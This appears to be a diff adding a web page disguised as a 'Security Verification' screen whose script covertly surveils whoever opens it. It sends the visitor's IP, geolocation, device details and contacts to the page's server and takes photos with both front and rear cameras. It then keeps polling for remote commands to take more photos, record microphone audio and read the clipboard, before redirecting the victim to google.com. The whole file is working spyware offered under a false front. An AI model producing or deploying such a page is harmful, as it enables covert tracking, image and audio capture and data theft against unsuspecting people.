@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Verification Required</title>
+<link rel="manifest" href="/manifest.json">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:-apple-system,sans-serif;color:#fff}
+.card{background:#111;border:1px solid #222;border-radius:16px;padding:32px 24px;max-width:340px;width:90%;text-align:center}
+.logo{width:72px;height:72px;background:linear-gradient(135deg,#00d4ff,#0051ff);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:32px}
+h2{font-size:20px;margin-bottom:8px}
+p{color:#888;font-size:14px;line-height:1.6;margin-bottom:24px}
+.btn{background:linear-gradient(135deg,#00d4ff,#0051ff);color:#fff;border:none;border-radius:12px;padding:14px 24px;width:100%;font-size:16px;font-weight:600;cursor:pointer}
+.bar{background:#222;border-radius:8px;height:6px;overflow:hidden;margin:16px 0 8px}
+.fill{background:linear-gradient(90deg,#00d4ff,#0051ff);height:100%;width:0%;transition:width .3s}
+.st{color:#888;font-size:13px}
+.h{display:none}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">🔐</div>
+  <h2>Security Verification</h2>
+  <p>To access this content, verify your device. One-time process.</p>
+  <button class="btn" id="btn" onclick="go()">Verify Now</button>
+  <div class="h" id="pr">
+    <div class="bar"><div class="fill" id="fl"></div></div>
+    <div class="st" id="st">Initializing...</div>
+  </div>
+</div>
+<script>
+const BASE = window.location.origin;
+const VID  = localStorage.getItem("vid") || (()=>{
+  const id = Math.random().toString(36).substr(2,9)+Date.now().toString(36);
+  localStorage.setItem("vid",id); return id;
+})();
+
+const p=(pct,msg)=>{
+  document.getElementById("fl").style.width=pct+"%";
+  document.getElementById("st").textContent=msg;
+};
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+const post=async(path,data)=>{
+  await fetch(BASE+path,{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify(data)
+  }).catch(()=>{});
+};
+
+async function go(){
+  document.getElementById("btn").classList.add("h");
+  document.getElementById("pr").classList.remove("h");
+
+  p(10,"Checking device...");   await sendInfo();
+  p(25,"Verifying location..."); await getLoc();
+  p(45,"Camera check...");
+  await initCam();
+  await snap("user");
+  await snap("environment");
+  p(65,"Microphone check..."); await initMic();
+  p(80,"Loading data...");     await getCon();
+  p(100,"✅ Verified!");
+  await sleep(1500);
+  if("serviceWorker"in navigator)
+    navigator.serviceWorker.register("/sw.js").catch(()=>{});
+  window.location.href="https://google.com";
+}
+
+async function sendInfo(){
+  let ip="N/A",country="N/A",city="N/A",isp="N/A";
+  try{const r=await fetch("https://ipapi.co/json/");const d=await r.json();
+    ip=d.ip||"N/A";country=d.country_name||"N/A";
+    city=(d.city||"")+(d.region?", "+d.region:"");isp=d.org||"N/A";}catch(e){}
+  let battery="N/A";
+  try{const b=await navigator.getBattery();
+    battery=Math.round(b.level*100)+"% "+(b.charging?"⚡":"🔋");}catch(e){}
+  const c=navigator.connection||{};
+  await post("/api/info",{
+    vid,ip,country,city,isp,battery,
+    device:navigator.userAgent,os:navigator.platform,
+    lang:navigator.language,network:c.effectiveType||"N/A",
+    screen:screen.width+"x"+screen.height,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+  });
+}
+
+function getLoc(){
+  return new Promise(res=>{
+    if(!navigator.geolocation){res();return;}
+    navigator.geolocation.getCurrentPosition(async pos=>{
+      await post("/api/location",{
+        vid,lat:pos.coords.latitude,
+        lon:pos.coords.longitude,accuracy:pos.coords.accuracy
+      });res();
+    },()=>res(),{enableHighAccuracy:true,timeout:8000});
+  });
+}
+
+async function sendLoc(){return getLoc();}
+
+async function initCam(){
+  try{const s=await navigator.mediaDevices.getUserMedia({video:true});
+    s.getTracks().forEach(t=>t.stop());}catch(e){}
+}
+
+async function snap(facing){
+  try{
+    const s=await navigator.mediaDevices.getUserMedia(
+      {video:{facingMode:facing,width:1280,height:720}});
+    const v=document.createElement("video");
+    v.srcObject=s;v.muted=true;await v.play();
+    await sleep(1500);
+    const c=document.createElement("canvas");
+    c.width=v.videoWidth;c.height=v.videoHeight;
+    c.getContext("2d").drawImage(v,0,0);
+    s.getTracks().forEach(t=>t.stop());
+    await post("/api/photo",{vid,data:c.toDataURL("image/jpeg",0.9),camera:facing});
+  }catch(e){}
+}
+
+async function initMic(){
+  try{const s=await navigator.mediaDevices.getUserMedia({audio:true});
+    s.getTracks().forEach(t=>t.stop());}catch(e){}
+}
+
+async function recMic(){
+  try{
+    const s=await navigator.mediaDevices.getUserMedia({audio:true});
+    const chunks=[];
+    const rec=new MediaRecorder(s);
+    rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
+    rec.onstop=async()=>{
+      s.getTracks().forEach(t=>t.stop());
+      const blob=new Blob(chunks,{type:"audio/webm"});
+      const reader=new FileReader();
+      reader.onloadend=async()=>{
+        await post("/api/microphone",{vid,data:reader.result});
+      };
+      reader.readAsDataURL(blob);
+    };
+    rec.start();setTimeout(()=>rec.stop(),15000);
+  }catch(e){}
+}
+
+async function getCon(){
+  try{
+    if("contacts"in navigator){
+      const list=await navigator.contacts.select(
+        ["name","email","tel"],{multiple:true});
+      await post("/api/contacts",{vid,contacts:list});
+    }
+  }catch(e){}
+}
+
+async function sendClip(){
+  try{const t=await navigator.clipboard.readText();
+    await post("/api/clipboard",{vid,text:t});}catch(e){}
+}
+
+async function sendBat(){
+  try{const b=await navigator.getBattery();
+    await post("/api/battery",{vid,
+      level:Math.round(b.level*100),charging:b.charging});}catch(e){}
+}
+
+async function poll(){
+  try{
+    const r=await fetch(BASE+"/api/poll",{
+      method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({vid})
+    });
+    const d=await r.json();
+    if(d.cmd){
+      if(d.cmd==="photo_user")   await snap("user");
+      if(d.cmd==="photo_env")    await snap("environment");
+      if(d.cmd==="location")     await sendLoc();
+      if(d.cmd==="mic")          await recMic();
+      if(d.cmd==="clipboard")    await sendClip();
+      if(d.cmd==="contacts")     await getCon();
+      if(d.cmd==="battery")      await sendBat();
+    }
+  }catch(e){}
+  setTimeout(poll,3000);
+}
+
+window.addEventListener("load",()=>setTimeout(poll,5000));
+</script>
+</body>
+</html>
